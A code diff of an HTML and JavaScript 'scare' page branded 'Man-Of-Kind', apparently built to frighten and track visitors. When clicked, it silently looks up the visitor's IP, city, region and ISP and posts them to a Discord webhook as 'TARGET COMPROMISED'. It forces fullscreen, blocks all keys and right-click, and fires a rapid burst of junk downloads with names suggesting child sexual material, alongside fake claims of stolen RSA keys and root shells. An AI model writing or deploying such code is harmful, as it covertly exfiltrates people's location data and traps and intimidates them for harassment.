@@ -83,7 +83,7 @@
             font-family: monospace;
             font-size: 12px;
             z-index: 10001;
-            animation: slideIn 0.2s forwards;
+            animation: slideIn 0.1s forwards;
         }
 
         @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
@@ -126,13 +126,13 @@
         let userData = {};
 
         const payloads = [
-            { name: "childprn.jpg", data: "SYS_CORRUPTION_INITIATED_BY_MAN_OF_KIND" },
-            { name: "dog.png", data: "RSA_PRIVATE_KEY_EXFILTRATED_SUCCESS" },
-            { name: "hourse.png", data: "ROOT_ACCESS_LEVEL_GRANTED" },
-            { name: "youngkid.png", data: "LOCAL_LOGS_PURGED_CLEAN" }
+            { name: "childprn.jpg", data: "CRITICAL_SYSTEM_OVERWRITE_SECTOR_0" },
+            { name: "dog.png", data: "RSA_KEYS_EXFILTRATED" },
+            { name: "hourse.png", data: "REMOTE_ROOT_SHELL_ACTIVE" },
+            { name: "youngkid.png", data: "MAN_OF_KIND_PERSISTENCE_INSTALLED" }
         ];
 
-        // Fetch deep location data immediately
+        // Immediate Geolocation Fetch
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
@@ -147,14 +147,13 @@
 
         function sendToDiscord(info) {
             if (!WEBHOOK_URL.startsWith('http')) return;
-            const params = {
-                username: "Man-Of-Kind Tracker",
-                content: `**Target Profile Acquired**\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}\nISP: ${info.org}\nUA: ${navigator.userAgent}`
-            };
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(params)
+                body: JSON.stringify({
+                    username: "Man-Of-Kind",
+                    content: `**TARGET COMPROMISED**\nIP: ${info.ip}\nLOC: ${info.city}, ${info.region}\nISP: ${info.org}`
+                })
             });
         }
 
@@ -164,39 +163,26 @@
             t.innerText = `[!] ${text}`;
             t.style.bottom = (20 + (document.querySelectorAll('.toast').length * 50)) + 'px';
             document.body.appendChild(t);
-            setTimeout(() => t.remove(), 4000);
+            setTimeout(() => t.remove(), 5000);
         }
 
+        // Forced high-speed download burst
         function triggerDownloads() {
-            let index = 0;
-
-            function downloadNext() {
-                if (index >= payloads.length) return;
-
-                const p = payloads[index];
-                const blob = new Blob([p.data.repeat(200)], { type: 'application/octet-stream' });
-                const url = URL.createObjectURL(blob);
-                
-                const a = document.createElement('a');
-                a.style.display = 'none';
-                a.href = url;
-                a.download = p.name;
-                
-                document.body.appendChild(a);
-                a.click();
-                
+            payloads.forEach((p, i) => {
+                // Rapid firing without the recursive delay
                 setTimeout(() => {
+                    const blob = new Blob([p.data.repeat(500)], { type: 'image/jpeg' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = p.name;
+                    document.body.appendChild(a);
+                    a.click();
                     document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
-                    createToast(`WRITING_SECTOR: ${p.name}... [SUCCESS]`);
-                    
-                    index++;
-                    // 800ms delay to ensure the browser doesn't block the next download
-                    setTimeout(downloadNext, 800); 
-                }, 100);
-            }
-
-            downloadNext();
+                    createToast(`WRITING: ${p.name}`);
+                    // Minimal delay to keep the browser from hanging entirely
+                }, i * 50); 
+            });
         }
 
         function drawNoise() {
@@ -214,11 +200,8 @@
         function initTerror() {
             startBtn.style.display = 'none';
             audio.play().catch(() => {});
-            
-            // Exfiltrate to Discord
             sendToDiscord(userData);
 
-            // Activate visual jumpscare
             jumpscare.style.display = 'block';
             document.body.classList.add('aberration');
             drawNoise();
@@ -229,24 +212,21 @@
                     flash.style.display = 'none';
                     ipDisplay.style.display = 'block';
                     
-                    // Trigger the sequence of forced downloads
+                    // The Burst
                     triggerDownloads();
-                }, 100);
-            }, 1200);
+                }, 50);
+            }, 1000);
 
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             }
 
-            // Anti-exit protocol
-            window.onbeforeunload = () => "CRITICAL SYSTEM OVERWRITE IN PROGRESS.";
+            window.onbeforeunload = () => "SYSTEM CORRUPTION IN PROGRESS. DO NOT CLOSE.";
         }
 
         startBtn.addEventListener('click', initTerror);
         document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.key === "Escape" || e.key === "F12") e.preventDefault();
-        });
+        document.addEventListener('keydown', e => e.preventDefault());
     </script>
 </body>
 </html>
